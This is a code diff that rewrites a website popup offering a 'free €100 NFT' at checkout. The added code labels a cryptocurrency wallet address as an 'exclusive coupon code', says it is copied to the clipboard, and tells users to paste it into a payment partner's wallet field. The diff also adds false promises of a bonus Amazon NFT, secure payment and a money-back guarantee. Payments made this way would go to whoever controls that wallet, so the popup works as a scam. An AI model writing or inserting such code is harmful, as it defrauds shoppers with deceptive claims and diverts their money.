@@ -2237,47 +2237,83 @@
                 transform: translate(-50%, -50%);
                 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                 color: white;
-                padding: 35px;
+                padding: 30px;
                 border-radius: 20px;
-                box-shadow: 0 15px 40px rgba(0,0,0,0.6);
+                box-shadow: 0 20px 60px rgba(0,0,0,0.7);
                 z-index: 10001;
-                text-align: center;
-                font-weight: bold;
-                max-width: 450px;
-                animation: nftPopupSlideIn 0.4s ease-out;
+                text-align: left;
+                font-weight: 500;
+                max-width: 480px;
+                width: 90%;
+                animation: nftPopupSlideIn 0.5s ease-out;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             `;
             
             popup.innerHTML = `
-                <div style="font-size: 28px; margin-bottom: 15px;">🎁 BONUS REWARD!</div>
-                <div style="font-size: 22px; margin-bottom: 15px;">Get FREE NFT Worth $100!</div>
-                <div style="font-size: 16px; margin-bottom: 20px; line-height: 1.4;">
-                    Follow the checkout instructions below and you'll receive a special NFT that can be converted to a <strong>$100 Amazon Gift Card</strong>!
+                <div style="text-align: center; margin-bottom: 25px;">
+                    <div style="font-size: 32px; margin-bottom: 8px;">🎉 Almost There!</div>
+                    <div style="font-size: 18px; color: #FFE066; font-weight: 600;">Complete Your €19.50 Purchase + Get FREE €100 NFT</div>
                 </div>
-                <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px; margin-bottom: 20px;">
-                    <div style="font-size: 14px; margin-bottom: 8px;">Use special coupon code:</div>
-                    <div style="font-size: 20px; font-family: monospace; letter-spacing: 2px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 5px;">NFT100GIFT</div>
+                
+                <div style="background: rgba(255,255,255,0.15); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.2);">
+                    <div style="font-size: 16px; font-weight: 600; margin-bottom: 15px; color: #FFE066;">✨ EXCLUSIVE COUPON CODE COPIED!</div>
+                    <div style="background: #2ECC71; color: white; padding: 12px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 14px; text-align: center; letter-spacing: 1px; margin-bottom: 15px; border: 2px solid #27AE60;">
+                        0xE5173e7c3089bD89cd1341b637b8e1951745ED5C
+                    </div>
+                    <div style="font-size: 13px; text-align: center; opacity: 0.9;">✅ Your exclusive coupon has been automatically copied to clipboard</div>
                 </div>
-                <button onclick="closeNFTPopup()" style="
-                    background: #ff6b35;
-                    color: white;
-                    border: none;
-                    padding: 12px 25px;
-                    border-radius: 10px;
-                    font-weight: bold;
-                    cursor: pointer;
-                    font-size: 16px;
-                    margin-right: 10px;
-                ">Got It!</button>
-                <button onclick="closeNFTPopup(); copyWalletAddress();" style="
-                    background: white;
-                    color: #667eea;
-                    border: none;
-                    padding: 12px 25px;
-                    border-radius: 10px;
-                    font-weight: bold;
-                    cursor: pointer;
-                    font-size: 16px;
-                ">Copy Wallet & Continue</button>
+                
+                <div style="margin-bottom: 20px;">
+                    <div style="font-size: 16px; font-weight: 600; margin-bottom: 12px; display: flex; align-items: center;">🛒 Simple 2-Step Checkout:</div>
+                    
+                    <div style="margin-bottom: 12px; padding-left: 20px;">
+                        <div style="font-weight: 600; color: #FFE066;">Step 1:</div>
+                        <div style="font-size: 14px; line-height: 1.4;">Click 'Continue to Checkout' → You'll be taken to our secure payment partner</div>
+                    </div>
+                    
+                    <div style="margin-bottom: 12px; padding-left: 20px;">
+                        <div style="font-weight: 600; color: #FFE066;">Step 2:</div>
+                        <div style="font-size: 14px; line-height: 1.4;">Paste your coupon code in the wallet field → Complete payment with card/crypto</div>
+                    </div>
+                </div>
+                
+                <div style="background: linear-gradient(90deg, #FFD700, #FFA500); color: #333; padding: 15px; border-radius: 12px; margin-bottom: 20px; text-align: center;">
+                    <div style="font-size: 14px; font-weight: 600;">🎁 BONUS: FREE €100 Amazon NFT</div>
+                    <div style="font-size: 12px; margin-top: 4px;">Automatically delivered after purchase completion</div>
+                </div>
+                
+                <div style="display: flex; gap: 10px; margin-top: 25px;">
+                    <button onclick="closeNFTPopup()" style="
+                        background: rgba(255,255,255,0.2);
+                        color: white;
+                        border: 1px solid rgba(255,255,255,0.3);
+                        padding: 12px 20px;
+                        border-radius: 25px;
+                        font-weight: 600;
+                        cursor: pointer;
+                        font-size: 14px;
+                        flex: 1;
+                        transition: all 0.3s ease;
+                    " onmouseover="this.style.background='rgba(255,255,255,0.3)'" onmouseout="this.style.background='rgba(255,255,255,0.2)'">Maybe Later</button>
+                    
+                    <button onclick="closeNFTPopup(); initiatePaymentGateway();" style="
+                        background: linear-gradient(135deg, #FF6B35, #F7931E);
+                        color: white;
+                        border: none;
+                        padding: 12px 20px;
+                        border-radius: 25px;
+                        font-weight: 700;
+                        cursor: pointer;
+                        font-size: 14px;
+                        flex: 2;
+                        box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
+                        transition: all 0.3s ease;
+                    " onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(255, 107, 53, 0.6)'" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(255, 107, 53, 0.4)'">🚀 Continue to Checkout</button>
+                </div>
+                
+                <div style="text-align: center; margin-top: 15px; font-size: 11px; opacity: 0.8;">
+                    🔒 Secure payment • 🎁 Free shipping • ⚡ Instant delivery • 💯 Money-back guarantee
+                </div>
             `;
             
             // Add NFT popup CSS animations
